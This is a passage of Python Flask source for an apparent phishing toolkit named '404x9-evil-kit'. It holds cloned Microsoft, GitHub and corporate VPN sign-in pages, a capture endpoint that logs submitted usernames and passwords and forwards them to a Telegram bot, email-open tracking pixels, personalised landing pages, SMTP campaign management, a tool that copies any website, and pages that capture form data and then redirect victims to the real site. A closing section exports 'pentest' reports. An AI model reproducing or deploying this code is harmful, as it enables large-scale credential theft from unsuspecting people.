        'button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:14px;cursor:pointer;margin-top:8px}'
        'button:hover{background:#106ebe}'
        '.foot{font-size:13px;color:#666;margin-top:16px}</style>'
        '</head><body><div class="wrap"><div class="logo">Microsoft</div><h1>Sign in</h1>'
        '<form method="POST" action="/api/phish/capture">'
        '<input name="username" placeholder="Email, phone, or Skype" required>'
        '<input name="password" type="password" placeholder="Password" required>'
        '<button type="submit">Sign in</button></form>'
        '<div class="foot">No account? <a href="#">Create one!</a></div></div></body></html>'
    ),
    'github': (
        '<!DOCTYPE html><html><head><title>Sign in to GitHub</title>'
        '<style>*{box-sizing:border-box;margin:0;padding:0}'
        'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f6f8fa}'
        'header{background:#24292f;padding:16px;text-align:center}'
        'header span{color:#fff;font-size:24px;font-weight:700;letter-spacing:-1px}'
        '.wrap{max-width:340px;margin:40px auto}'
        '.box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:20px;margin-bottom:16px}'
        'h1{font-size:24px;font-weight:300;text-align:center;margin-bottom:16px;color:#24292f}'
        'label{display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:#24292f}'
        'input{width:100%;padding:7px 12px;margin-bottom:12px;border:1px solid #d0d7de;border-radius:6px;font-size:14px}'
        'button{width:100%;padding:8px;background:#2da44e;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer;font-weight:600}'
        'button:hover{background:#2c974b}</style>'
        '</head><body><header><span>GitHub</span></header><div class="wrap"><div class="box">'
        '<h1>Sign in to GitHub</h1>'
        '<form method="POST" action="/api/phish/capture">'
        '<label>Username or email address</label><input name="username" required>'
        '<label>Password</label><input name="password" type="password" required>'
        '<button type="submit">Sign in</button></form></div></div></body></html>'
    ),
    'vpn': (
        '<!DOCTYPE html><html><head><title>VPN Portal</title>'
        '<style>*{box-sizing:border-box;margin:0;padding:0}'
        'body{font-family:"Segoe UI",sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}'
        '.card{background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:40px;width:380px}'
        'h2{color:#fff;text-align:center;margin-bottom:8px;font-size:22px}'
        '.sub{color:rgba(255,255,255,.5);text-align:center;font-size:13px;margin-bottom:28px}'
        'label{color:rgba(255,255,255,.7);font-size:13px;display:block;margin-bottom:5px}'
        'input{width:100%;padding:10px 14px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:6px;color:#fff;font-size:14px;margin-bottom:16px;outline:none}'
        'input:focus{border-color:#4a9eff}'
        'button{width:100%;padding:12px;background:linear-gradient(90deg,#4a9eff,#0078d4);color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;font-weight:600}'
        '.ico{text-align:center;font-size:40px;margin-bottom:16px}</style>'
        '</head><body><div class="card"><div class="ico">🔒</div>'
        '<h2>Corporate VPN</h2><div class="sub">Secure Remote Access Portal</div>'
        '<form method="POST" action="/api/phish/capture">'
        '<label>Username</label><input name="username" placeholder="domain\\username" required>'
        '<label>Password</label><input name="password" type="password" placeholder="••••••••" required>'
        '<button type="submit">Connect</button></form></div></body></html>'
    ),
}

# ── Telegram exfil config ─────────────────────────────────────────────────────
def _tg_send(text):
    """Fire-and-forget Telegram message. Runs in a daemon thread."""
    with _tg_lock:
        cfg = dict(_tg_config)
    if not cfg['enabled'] or not cfg['token'] or not cfg['chat_id']:
        return
    import urllib.request, urllib.parse
    def _worker():
        try:
            url  = 'https://api.telegram.org/bot' + cfg['token'] + '/sendMessage'
            body = urllib.parse.urlencode({'chat_id': cfg['chat_id'],
                                           'text': text[:4096],
                                           'parse_mode': 'HTML'}).encode()
            req  = urllib.request.Request(url, data=body, method='POST')
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass
    threading.Thread(target=_worker, daemon=True).start()

@app.route('/api/tg/config', methods=['GET', 'POST'])
def tg_config():
    global _tg_config
    if request.method == 'POST':
        d = request.json or {}
        with _tg_lock:
            if 'token'   in d: _tg_config['token']   = str(d['token'])[:200]
            if 'chat_id' in d: _tg_config['chat_id']  = str(d['chat_id'])[:50]
            if 'enabled' in d: _tg_config['enabled']  = bool(d['enabled'])
        _save_state()
        return jsonify({'ok': True})
    with _tg_lock:
        safe = {'enabled': _tg_config['enabled'],
                'token_set': bool(_tg_config['token']),
                'chat_id_set': bool(_tg_config['chat_id'])}
    return jsonify(safe)

@app.route('/api/tg/test', methods=['POST'])
def tg_test():
    _tg_send('<b>\U0001f512 Test</b>\nConexion exitosa desde 404x9.')
    return jsonify({'ok': True})

# ── Basic creds store (backwards-compat) ──────────────────────────────────────
@app.route('/api/phish/creds')
def phish_get_creds():
    with phish_lock:
        return jsonify({'creds': list(phish_creds)})

@app.route('/api/phish/clear', methods=['POST'])
def phish_clear_creds():
    with phish_lock:
        phish_creds.clear()
    _save_state()
    return jsonify({'ok': True})

@app.route('/api/phish/capture', methods=['GET', 'POST'])
def phish_capture():
    """Credential capture endpoint (supports GET + POST). Updates campaign stats."""
    data         = request.form.to_dict() if request.method == 'POST' else {}
    data['ip']   = request.remote_addr
    data['ts']   = datetime.datetime.now().isoformat()
    data['ua']   = request.headers.get('User-Agent', '')[:200]
    track_id     = request.args.get('track_id', '')
    redirect_url = request.args.get('redirect', 'https://google.com')

    if track_id:
        data['track_id'] = track_id
        cid = ''
        with track_lock:
            tr  = phish_tracking.get(track_id, {})
            cid = tr.get('campaign_id', '')
            data['email_target'] = tr.get('email', '')
            data['name_target']  = tr.get('name', '')
        if cid:
            with camp_lock:
                if cid in campaigns:
                    campaigns[cid]['stats']['captured'] += 1
                    for t in campaigns[cid]['targets']:
                        if t.get('track_id') == track_id:
                            t['status']   = 'captured'
                            t['captured'] = {k: v for k, v in data.items()
                                             if k not in ('ua',)}
                            break
        _log_phish('[CAPTURED] ' + data.get('email_target','?') +
                   ' u=' + data.get('username', data.get('email', '?')) +
                   ' ip=' + data['ip'], 'crit')

    with phish_lock:
        phish_creds.append(data)
    _save_state()

    # Forward to Telegram (server-side, token never exposed to client)
    def _fmt_tg(d):
        skip = {'ua', 'ts', 'template', 'track_id'}
        lines = ['<b>&#127919; CAPTURE</b>  <code>' + d.get('ip','?') + '</code>',
                 '<b>Page:</b> ' + d.get('page', d.get('template','?')),
                 '<b>URL:</b> '  + d.get('url', '?')[:120]]
        for k, v in d.items():
            if k not in skip and v and k != 'ip':
                lines.append('<b>' + k + ':</b> <code>' + str(v)[:200] + '</code>')
        return '\n'.join(lines)
    _tg_send(_fmt_tg(data))

    return '<script>window.location="' + redirect_url + '"</script>', 200

@app.route('/api/phish/page/<template_name>')
def phish_page(template_name):
    """Serve a built-in phishing page (no campaign context)."""
    tmpl = PHISH_TEMPLATES.get(template_name, PHISH_TEMPLATES['generic'])
    return tmpl, 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route('/api/phish/templates')
def phish_templates_api():
    return jsonify({'templates': list(PHISH_TEMPLATES.keys())})

# ── Tracking Pixel ─────────────────────────────────────────────────────────────
@app.route('/api/phish/px/<track_id>')
def phish_pixel(track_id):
    now = datetime.datetime.now().isoformat()
    cid = None
    with track_lock:
        if track_id in phish_tracking:
            tr = phish_tracking[track_id]
            if not tr.get('opened'):
                tr['opened']  = True
                tr['open_ts'] = now
                tr['open_ip'] = request.remote_addr
                tr['open_ua'] = request.headers.get('User-Agent', '')[:200]
            cid = tr.get('campaign_id')
    if cid:
        with camp_lock:
            if cid in campaigns:
                campaigns[cid]['stats']['opened'] += 1
                for t in campaigns[cid]['targets']:
                    if t.get('track_id') == track_id and t['status'] in ('sent', 'pending'):
                        t['status']  = 'opened'
                        t['open_ts'] = now
                        t['open_ip'] = request.remote_addr
                        break
    _log_phish('[OPEN] track=' + track_id[:8] + ' ip=' + request.remote_addr, 'ok')
    return PIXEL_GIF, 200, {
        'Content-Type': 'image/gif',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'X-Content-Type-Options': 'nosniff'
    }

# ── Landing Page ───────────────────────────────────────────────────────────────
@app.route('/api/phish/land/<track_id>')
def phish_landing(track_id):
    """Serve personalised phishing page for a tracked target."""
    now          = datetime.datetime.now().isoformat()
    cid          = ''
    redirect_url = 'https://google.com'
    with track_lock:
        tr  = phish_tracking.get(track_id, {})
        cid = tr.get('campaign_id', '')

    html = ''
    with camp_lock:
        camp = campaigns.get(cid, {})
        redirect_url = camp.get('redirect_url', 'https://google.com')
        clone_id     = camp.get('clone_id', '')
        tmpl_name    = camp.get('template', 'generic')
        custom       = camp.get('custom_html', '')
        if cid in campaigns:
            campaigns[cid]['stats']['clicked'] += 1
            for t in campaigns[cid]['targets']:
                if t.get('track_id') == track_id:
                    if t['status'] in ('sent', 'opened', 'pending'):
                        t['status'] = 'clicked'
                    t['click_ts'] = now
                    break

    if clone_id:
        with clone_lock:
            c    = cloned_sites.get(clone_id, {})
            html = c.get('html', '')
    if not html and custom:
        html = custom
    if not html:
        html = PHISH_TEMPLATES.get(tmpl_name, PHISH_TEMPLATES['generic'])

    # Variable substitution
    with track_lock:
        tr = phish_tracking.get(track_id, {})
    html = html.replace('{{email}}', tr.get('email', ''))
    html = html.replace('{{name}}',  tr.get('name',  ''))
    html = html.replace('{{track_id}}', track_id)

    html = _build_landing(html, track_id, redirect_url)
    _log_phish('[CLICK] track=' + track_id[:8] + ' ip=' + request.remote_addr, 'warn')
    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}

# ── Campaign CRUD ──────────────────────────────────────────────────────────────
@app.route('/api/campaign/create', methods=['POST'])
def campaign_create():
    data = request.json or {}
    cid  = uuid.uuid4().hex[:8]
    now  = datetime.datetime.now().isoformat()
    camp = {
        'id': cid,
        'name':         data.get('name', 'Campaign-' + cid[:4]),
        'status':       'created',
        'template':     data.get('template', 'generic'),
        'custom_html':  data.get('custom_html', ''),
        'clone_id':     data.get('clone_id', ''),
        'redirect_url': data.get('redirect_url', 'https://google.com'),
        'smtp_host':    data.get('smtp_host', ''),
        'smtp_port':    data.get('smtp_port', '25'),
        'smtp_user':    data.get('smtp_user', ''),
        'smtp_pass':    data.get('smtp_pass', ''),
        'smtp_tls':     data.get('smtp_tls', False),
        'from_name':    data.get('from_name', 'IT Support'),
        'from_email':   data.get('from_email', ''),
        'subject':      data.get('subject', 'Action Required'),
        'email_body':   data.get('email_body', ''),
        'targets':      [],
        'created_at':   now,
        'started_at':   None,
        'stopped_at':   None,
        'stats': {'total': 0, 'sent': 0, 'opened': 0, 'clicked': 0, 'captured': 0},
    }
    with camp_lock:
        campaigns[cid] = camp
    _log_phish('Campaign created: ' + camp['name'] + ' [' + cid + ']')
    return jsonify({'id': cid, 'campaign': camp})

@app.route('/api/campaign/list')
def campaign_list():
    with camp_lock:
        return jsonify({'campaigns': list(campaigns.values())})

@app.route('/api/campaign/<cid>', methods=['GET'])
def campaign_get(cid):
    with camp_lock:
        c = campaigns.get(cid)
    if not c:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(c)

@app.route('/api/campaign/<cid>', methods=['DELETE'])
def campaign_delete(cid):
    with camp_lock:
        c = campaigns.pop(cid, None)
    if c:
        _log_phish('Campaign deleted: ' + (c.get('name') or cid))
    return jsonify({'ok': True})

@app.route('/api/campaign/<cid>/update', methods=['POST'])
def campaign_update(cid):
    data = request.json or {}
    fields = ('name','template','custom_html','clone_id','redirect_url',
              'smtp_host','smtp_port','smtp_user','smtp_pass','smtp_tls',
              'from_name','from_email','subject','email_body')
    with camp_lock:
        if cid not in campaigns:
            return jsonify({'error': 'Not found'}), 404
        for k in fields:
            if k in data:
                campaigns[cid][k] = data[k]
    return jsonify({'ok': True})

@app.route('/api/campaign/<cid>/start', methods=['POST'])
def campaign_start(cid):
    now = datetime.datetime.now().isoformat()
    with camp_lock:
        if cid not in campaigns:
            return jsonify({'error': 'Not found'}), 404
        campaigns[cid]['status']     = 'running'
        campaigns[cid]['started_at'] = now
        name = campaigns[cid]['name']
    _log_phish('Campaign started: ' + name, 'ok')
    return jsonify({'ok': True})

@app.route('/api/campaign/<cid>/stop', methods=['POST'])
def campaign_stop(cid):
    now = datetime.datetime.now().isoformat()
    with camp_lock:
        if cid not in campaigns:
            return jsonify({'error': 'Not found'}), 404
        campaigns[cid]['status']     = 'stopped'
        campaigns[cid]['stopped_at'] = now
        name = campaigns[cid]['name']
    _log_phish('Campaign stopped: ' + name, 'warn')
    return jsonify({'ok': True})

# ── Target Management ──────────────────────────────────────────────────────────
@app.route('/api/campaign/<cid>/targets/add', methods=['POST'])
def campaign_add_targets(cid):
    data    = request.json or {}
    targets = data.get('targets', [])
    added   = []
    with camp_lock:
        if cid not in campaigns:
            return jsonify({'error': 'Not found'}), 404
        for t in targets:
            email = (t.get('email') or '').strip()
            if not email:
                continue
            tid    = uuid.uuid4().hex[:12]
            target = {
                'id':       tid,
                'email':    email,
                'name':     (t.get('name') or email.split('@')[0]),
                'status':   'pending',
                'track_id': tid,
                'sent_at':  None, 'open_ts': None, 'open_ip': None,
                'open_ua':  None, 'click_ts': None, 'captured': None,
            }
            campaigns[cid]['targets'].append(target)
            campaigns[cid]['stats']['total'] += 1
            added.append(target)
    with track_lock:
        for t in added:
            phish_tracking[t['track_id']] = {
                'campaign_id': cid,
                'target_id':   t['id'],
                'email':       t['email'],
                'name':        t['name'],
                'opened':      False,
                'open_ts':     None,
                'open_ip':     None,
                'open_ua':     None,
            }
    _log_phish('Added ' + str(len(added)) + ' targets to [' + cid + ']')
    return jsonify({'added': len(added)})

@app.route('/api/campaign/<cid>/targets/clear', methods=['POST'])
def campaign_clear_targets(cid):
    with camp_lock:
        if cid not in campaigns:
            return jsonify({'error': 'Not found'}), 404
        old = len(campaigns[cid]['targets'])
        campaigns[cid]['targets'] = []
        campaigns[cid]['stats']   = {'total': 0, 'sent': 0, 'opened': 0, 'clicked': 0, 'captured': 0}
    return jsonify({'cleared': old})

@app.route('/api/campaign/<cid>/target/<tid>/sent', methods=['POST'])
def target_mark_sent(cid, tid):
    now = datetime.datetime.now().isoformat()
    with camp_lock:
        if cid in campaigns:
            for t in campaigns[cid]['targets']:
                if t['id'] == tid and t['status'] == 'pending':
                    t['status']  = 'sent'
                    t['sent_at'] = now
                    campaigns[cid]['stats']['sent'] += 1
                    break
    return jsonify({'ok': True})

# ── Tracker & Logs ─────────────────────────────────────────────────────────────
@app.route('/api/campaign/tracker')
def campaign_tracker():
    """All targets across campaigns, sorted by most recent activity."""
    result = []
    with camp_lock:
        for camp in campaigns.values():
            host = request.host or 'localhost:5000'
            for t in camp.get('targets', []):
                result.append({
                    'campaign_id':     camp['id'],
                    'campaign_name':   camp['name'],
                    'campaign_status': camp['status'],
                    'email':    t['email'],
                    'name':     t['name'],
                    'status':   t['status'],
                    'track_id': t.get('track_id', ''),
                    'sent_at':  t.get('sent_at'),
                    'open_ts':  t.get('open_ts'),
                    'open_ip':  t.get('open_ip'),
                    'click_ts': t.get('click_ts'),
                    'captured': t.get('captured') is not None,
                    'link': 'http://' + host + '/api/phish/land/' + t.get('track_id', ''),
                })
    result.sort(
        key=lambda x: x.get('click_ts') or x.get('open_ts') or x.get('sent_at') or '',
        reverse=True
    )
    return jsonify({'targets': result})

@app.route('/api/phish/logs')
def phish_logs():
    since = request.args.get('since', '')
    with clog_lock:
        logs = [l for l in _camp_logs if (not since or l['ts'] > since)]
    return jsonify({'logs': logs[-200:]})

# ── Site Cloner ────────────────────────────────────────────────────────────────
@app.route('/api/phish/clone_site', methods=['POST'])
def phish_clone_site():
    data = request.json or {}
    url  = (data.get('url') or '').strip()
    if not url:
        return jsonify({'error': 'No URL provided'}), 400
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        import urllib.request as _ur
        import urllib.parse   as _up
        import re as _re
        req = _ur.Request(url, headers={
            'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept':          'text/html,application/xhtml+xml,*/*;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        with _ur.urlopen(req, timeout=15) as resp:
            final_url = resp.url
            raw       = resp.read(5_000_000)   # max 5 MB

        try:
            html = raw.decode('utf-8')
        except UnicodeDecodeError:
            html = raw.decode('latin-1', errors='replace')

        parsed = _up.urlparse(final_url)
        base   = parsed.scheme + '://' + parsed.netloc

        # Make relative paths absolute
        html = _re.sub(r'((?:href|src|action)=")(/[^"]*)',
                       lambda m: m.group(1) + base + m.group(2), html)
        html = _re.sub(r"((?:href|src|action)=')(/[^']*)",
                       lambda m: m.group(1) + base + m.group(2), html)
        # Protocol-relative
        html = _re.sub(r'((?:href|src)=")(//)',
                       lambda m: m.group(1) + parsed.scheme + ':', html)

        clone_id = uuid.uuid4().hex[:8]
        with clone_lock:
            cloned_sites[clone_id] = {
                'id':         clone_id,
                'url':        final_url,
                'html':       html,
                'size':       len(html),
                'created_at': datetime.datetime.now().isoformat(),
            }
        _log_phish('Cloned: ' + final_url + ' [' + clone_id + '] ' + str(len(html)) + 'B', 'ok')
        return jsonify({'clone_id': clone_id, 'url': final_url, 'size': len(html)})
    except Exception as e:
        _log_phish('Clone failed: ' + url + ' — ' + str(e), 'err')
        return jsonify({'error': str(e)}), 500

@app.route('/api/phish/clones')
def phish_clones():
    with clone_lock:
        result = [{'id': c['id'], 'url': c['url'], 'size': c['size'], 'created_at': c['created_at']}
                  for c in cloned_sites.values()]
    return jsonify({'clones': result})

@app.route('/api/phish/clone/<clone_id>/preview')
def phish_clone_preview(clone_id):
    with clone_lock:
        c = cloned_sites.get(clone_id)
    if not c:
        return 'Clone not found', 404
    return c['html'], 200, {'Content-Type': 'text/html; charset=utf-8'}


# ── Quick-deploy pages  (/p/<id>) ─────────────────────────────────────────────
@app.route('/api/phish/deploy', methods=['POST'])
def phish_deploy():
    """Store an HTML page and return a clean public URL (/p/<id>)."""
    data    = request.json or {}
    html    = data.get('html', '').strip()
    name    = data.get('name', 'page')[:80]
    if not html:
        return jsonify({'error': 'html required'}), 400
    page_id = uuid.uuid4().hex[:8]
    now     = datetime.datetime.now().isoformat()
    redirect_url = data.get('redirect_url', '').strip() or 'https://google.com'
    with deploy_lock:
        deployed_pages[page_id] = {
            'html':         html,
            'name':         name,
            'active':       True,
            'created_at':   now,
            'hits':         0,
            'redirect_url': redirect_url,
        }
    _log_phish('[DEPLOY] id=' + page_id + ' name=' + name, 'info')
    _save_state()
    return jsonify({'id': page_id, 'url': '/p/' + page_id})

@app.route('/api/phish/deploy/<page_id>', methods=['POST'])
def phish_deploy_stop(page_id):
    """Toggle active state of a deployed page."""
    data = request.json or {}
    with deploy_lock:
        if page_id not in deployed_pages:
            return jsonify({'error': 'not found'}), 404
        deployed_pages[page_id]['active'] = data.get('active', False)
    _save_state()
    return jsonify({'ok': True})

@app.route('/p/<page_id>', methods=['GET', 'POST'])
def serve_deployed_page(page_id):
    """Serve a quick-deployed phishing page and capture any form submissions."""
    with deploy_lock:
        page = deployed_pages.get(page_id)
    if not page:
        return 'Not found', 404
    if not page.get('active', True):
        return 'This page is no longer available.', 410

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')[:120]

    if request.method == 'POST':
        # Collect form data — flatten MultiDict, skip empty values
        data = {k: v for k, v in request.form.items() if v}
        # Also grab JSON body if sent that way (JS fetch payloads)
        if not data and request.is_json:
            data = request.get_json(silent=True) or {}
        with deploy_lock:
            deployed_pages[page_id]['hits'] += 1
        _log_phish('[SUBMIT] page=' + page_id + ' ip=' + ip + ' data=' + str(data)[:300], 'warn')
        # Forward to Telegram
        def _fmt_page(d, pid, nm):
            lines = ['<b>&#127919; SUBMIT</b>  <code>' + ip + '</code>',
                     '<b>Page:</b> ' + nm + '  <code>' + pid + '</code>']
            for k, v in d.items():
                if v: lines.append('<b>' + k + ':</b> <code>' + str(v)[:200] + '</code>')
            return '\n'.join(lines)
        _tg_send(_fmt_page(data, page_id, page.get('name', page_id)))
        # Log as phish cred so it appears in the LOGS tab
        with phish_lock:
            phish_creds.append({
                'ts':       datetime.datetime.now().isoformat(),
                'page_id':  page_id,
                'page':     page.get('name', page_id),
                'ip':       ip,
                'ua':       ua,
                'data':     data,
            })
        # Redirect to the real site being spoofed
        redirect_to = page.get('redirect_url') or data.get('redirect') or 'https://google.com'
        from flask import redirect as flask_redirect
        return flask_redirect(redirect_to, 302)

    # GET — serve the page
    with deploy_lock:
        deployed_pages[page_id]['hits'] += 1
    _log_phish('[HIT] page=' + page_id + ' ip=' + ip + ' ua=' + ua[:80], 'info')
    return page['html'], 200, {'Content-Type': 'text/html; charset=utf-8'}

# ═══════════════════════════════════════════════════════════════════════════════
# ── REPORTS SYSTEM ──────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════
_REPORTS_FILE = os.path.join(_DATA_DIR, 'reports.json')
_reports      = {}
_rpt_lock     = threading.Lock()

def _rpt_load():
    if not os.path.isfile(_REPORTS_FILE):
        return
    try:
        with open(_REPORTS_FILE, 'r', encoding='utf-8') as f:
            _reports.update(json.load(f))
        print(f'[reports] loaded {len(_reports)} report(s)')
    except Exception as e:
        print('[reports] load error:', e)

def _rpt_save():
    try:
        tmp = _REPORTS_FILE + '.tmp'
        with _rpt_lock:
            data = dict(_reports)
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
        os.replace(tmp, _REPORTS_FILE)
    except Exception as e:
        print('[reports] save error:', e)

@app.route('/api/reports', methods=['GET'])
def api_reports_list():
    with _rpt_lock:
        items = sorted(_reports.values(), key=lambda r: r.get('timestamp', ''), reverse=True)
    return jsonify({'ok': True, 'reports': items})

@app.route('/api/reports/save', methods=['POST'])
def api_reports_save():
    data = request.json or {}
    rid  = uuid.uuid4().hex[:8]
    now  = datetime.datetime.now()
    report = {
        'id':               rid,
        'timestamp':        now.isoformat(),
        'tool':             str(data.get('tool', 'unknown'))[:80],
        'command':          str(data.get('command', ''))[:2000],
        'target':           str(data.get('target', ''))[:200],
        'credentials_used': data.get('credentials_used') or {},
        'raw_output':       str(data.get('raw_output', ''))[:200000],
        'parsed_html':      str(data.get('parsed_html', ''))[:500000],
        'summary':          str(data.get('summary', ''))[:1000],
        'findings':         list(data.get('findings') or [])[:50],
        'indicators':       list(data.get('indicators') or [])[:30],
        'errors':           list(data.get('errors') or [])[:30],
        'evidence':         list(data.get('evidence') or [])[:20],
    }
    with _rpt_lock:
        _reports[rid] = report
    threading.Thread(target=_rpt_save, daemon=True).start()
    return jsonify({'ok': True, 'id': rid})

@app.route('/api/reports/<rid>', methods=['GET'])
def api_reports_get(rid):
    with _rpt_lock:
        r = _reports.get(rid)
    if not r:
        return jsonify({'error': 'not found'}), 404
    return jsonify({'ok': True, 'report': r})

@app.route('/api/reports/<rid>', methods=['DELETE'])
def api_reports_delete(rid):
    with _rpt_lock:
        _reports.pop(rid, None)
    threading.Thread(target=_rpt_save, daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/reports', methods=['DELETE'])
def api_reports_clear():
    with _rpt_lock:
        _reports.clear()
    threading.Thread(target=_rpt_save, daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/reports/<rid>/raw')
def api_reports_raw(rid):
    with _rpt_lock:
        r = _reports.get(rid)
    if not r:
        return jsonify({'error': 'not found'}), 404
    ts    = datetime.datetime.fromisoformat(r['timestamp']).strftime('%Y%m%d_%H%M%S')
    fname = f"raw_{r['tool']}_{ts}.txt"
    return Response(r.get('raw_output', ''), mimetype='text/plain',
                    headers={'Content-Disposition': f'attachment; filename="{fname}"'})

@app.route('/api/reports/<rid>/parsed')
def api_reports_parsed_dl(rid):
    with _rpt_lock:
        r = _reports.get(rid)
    if not r:
        return jsonify({'error': 'not found'}), 404
    ts      = datetime.datetime.fromisoformat(r['timestamp']).strftime('%Y%m%d_%H%M%S')
    fname   = f"parsed_{r['tool']}_{ts}.json"
    payload = r.get('parsed_output') or {}
    return Response(json.dumps(payload, indent=2, default=str),
                    mimetype='application/json',
                    headers={'Content-Disposition': f'attachment; filename="{fname}"'})

class _DocxHtmlWriter:
    """Minimal HTML→docx converter: preserves tables, lists, and line structure."""
    def __init__(self, doc, pt=8):
        self.doc = doc
        self.pt  = pt
        self._rows    = []
        self._cur_row = None
        self._cur_cell= []
        self._in_tbl  = False
        self._in_cell = False
        self._in_list = False
        self._buf     = []

    def feed(self, html):
        from html.parser import HTMLParser
        import html as _hm
        w = self
        class _P(HTMLParser):
            def handle_starttag(self, tag, a): w._start(tag.lower())
            def handle_endtag(self, tag):      w._end(tag.lower())
            def handle_data(self, d):          w._data(d)
            def handle_entityref(self, n):     w._data(_hm.unescape(f'&{n};'))
            def handle_charref(self, n):
                w._data(chr(int(n[1:],16) if n.startswith('x') else int(n)))
        _P().feed(html or '')
        t = self._flush()
        if t: self._para(t)

    # ── helpers ──
    def _flush(self):
        t = ''.join(self._buf).strip()
        self._buf = []
        return t

    def _para(self, txt, bullet=False):
        from docx.shared import Pt
        if not txt: return
        p = self.doc.add_paragraph(style='List Bullet' if bullet else 'Normal')
        r = p.add_run(txt)
        r.font.name = 'Courier New'
        r.font.size = Pt(self.pt)

    def _flush_tbl(self):
        from docx.shared import Pt
        if not self._rows: return
        nc = max(len(r) for r in self._rows)
        t  = self.doc.add_table(rows=len(self._rows), cols=nc)
        t.style = 'Table Grid'
        for ri, row in enumerate(self._rows):
            for ci, txt in enumerate(row):
                if ci < nc:
                    cell = t.rows[ri].cells[ci]
                    cell.text = ''
                    run = cell.paragraphs[0].add_run(txt)
                    run.font.name = 'Courier New'
                    run.font.size = Pt(max(self.pt - 1, 6))
        self._rows = []

    # ── parser callbacks ──
    def _start(self, tag):
        if tag == 'table':
            t = self._flush()
            if t: self._para(t)
            self._in_tbl = True
            self._rows = []
        elif tag == 'tr':
            self._cur_row = []
        elif tag in ('td','th'):
            self._in_cell = True
            self._cur_cell = []
        elif tag == 'br':
            if self._in_cell: self._cur_cell.append('\n')
            else: self._buf.append('\n')
        elif tag in ('ul','ol'):
            t = self._flush()
            if t: self._para(t)
            self._in_list = True
        elif tag == 'li':
            self._buf = []

    def _end(self, tag):
        if tag == 'table':
            self._flush_tbl()
            self._in_tbl = False
        elif tag in ('td','th'):
            if self._cur_row is not None:
                self._cur_row.append(''.join(self._cur_cell).strip())
            self._in_cell = False
            self._cur_cell = []
        elif tag == 'tr':
            if self._cur_row is not None:
                self._rows.append(self._cur_row)
            self._cur_row = None
        elif tag == 'li':
            self._para(self._flush(), bullet=True)
        elif tag in ('ul','ol'):
            self._in_list = False
        elif tag in ('div','p') and not self._in_tbl and not self._in_cell:
            t = self._flush()
            if t and not self._in_list: self._para(t)

    def _data(self, d):
        if self._in_cell: self._cur_cell.append(d)
        else: self._buf.append(d)


@app.route('/api/reports/<rid>/export/docx')
def api_reports_docx(rid):
    with _rpt_lock:
        r = _reports.get(rid)
    if not r:
        return jsonify({'error': 'not found'}), 404
    try:
        from docx import Document
        from docx.shared import Pt, RGBColor
        from docx.enum.text import WD_ALIGN_PARAGRAPH
        import io as _io
        doc = Document()
        ts  = datetime.datetime.fromisoformat(r['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
        t   = doc.add_heading('PENTEST REPORT — 404x9-evil-kit', 0)
        t.alignment = WD_ALIGN_PARAGRAPH.CENTER
        p   = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run(f"{r.get('tool','').upper()}  ·  {ts}  ·  ID: {r['id']}")
        run.font.color.rgb = RGBColor(0x22, 0x88, 0x44)
        doc.add_paragraph()
        doc.add_heading('Detalles de Ejecución', 1)
        tbl = doc.add_table(rows=0, cols=2)
        tbl.style = 'Table Grid'
        for lbl, val in [
            ('Herramienta', r.get('tool', '')),
            ('Target',      r.get('target', '')),
            ('Timestamp',   ts),
            ('Comando',     r.get('command', '')),
            ('Auth usada',  str(r.get('credentials_used', ''))),
        ]:
            row = tbl.add_row()
            row.cells[0].text = lbl
            row.cells[1].text = str(val)
        doc.add_paragraph()
        doc.add_heading('Resumen', 1)
        doc.add_paragraph(r.get('summary', ''))
        if r.get('findings'):
            doc.add_heading(f"Hallazgos ({len(r['findings'])})", 1)
            for fi in r['findings']:
                doc.add_paragraph(str(fi), style='List Bullet')
        if r.get('indicators'):
            doc.add_heading(f"Indicadores ({len(r['indicators'])})", 1)
            for ind in r['indicators']:
                doc.add_paragraph(str(ind), style='List Bullet')
        if r.get('errors'):
            doc.add_heading(f"Errores ({len(r['errors'])})", 1)
            for err in r['errors']:
                doc.add_paragraph(str(err), style='List Bullet')
        if r.get('evidence'):
            doc.add_heading(f"Evidencia ({len(r['evidence'])})", 1)
            for ev in r['evidence']:
                doc.add_paragraph(str(ev), style='List Bullet')
        parsed_html_raw = r.get('parsed_html', '')
        if parsed_html_raw:
            doc.add_heading('Output PARSED', 1)
            _DocxHtmlWriter(doc, pt=8).feed(parsed_html_raw[:200000])
        doc.add_heading('Output RAW Completo', 1)
        raw_p = doc.add_paragraph()
        raw_r = raw_p.add_run(r.get('raw_output', '')[:50000])
        raw_r.font.name = 'Courier New'
        raw_r.font.size = Pt(7)
        buf = _io.BytesIO()
        doc.save(buf)
        buf.seek(0)
        ts2   = datetime.datetime.fromisoformat(r['timestamp']).strftime('%Y%m%d_%H%M%S')
        fname = f"report_{r['tool']}_{ts2}.docx"
        return Response(
            buf.read(),
            mimetype='application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            headers={'Content-Disposition': f'attachment; filename="{fname}"'}
        )
    except ImportError:
